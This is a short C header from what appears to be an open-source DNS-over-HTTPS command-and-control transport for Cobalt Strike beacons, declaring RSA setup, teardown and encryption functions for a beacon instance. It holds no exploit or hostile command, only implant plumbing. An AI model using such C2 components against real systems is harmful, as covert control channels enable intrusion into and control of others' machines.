/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

/*-
 *
 * CryptRsaInit
 *
 * Purpose:
 *
 * Creates a key object for RSA
 *
-*/
DEFINESEC(B) BOOL CryptRsaInit( PBEACON_INSTANCE Ins );

/*-
 *
 * CryptRsaFree
 *
 * Purpose:
 *
 * Free's the associated keys for RSA
 *
-*/
DEFINESEC(B) VOID CryptRsaFree( PBEACON_INSTANCE Ins );

/*-
 *
 * CryptRsaEncrypt
 *
 * Purpose:
 *
 * Encrypt's the buffer using RSA
 * PKCS #1 v1.5
 *
-*/
DEFINESEC(B) BOOL CryptRsaEncrypt( PBEACON_INSTANCE Ins,
                                   PVOID        In,
                                   ULONG        InLen,
                                   PVOID*       Out,
                                   ULONG*       OutLen );
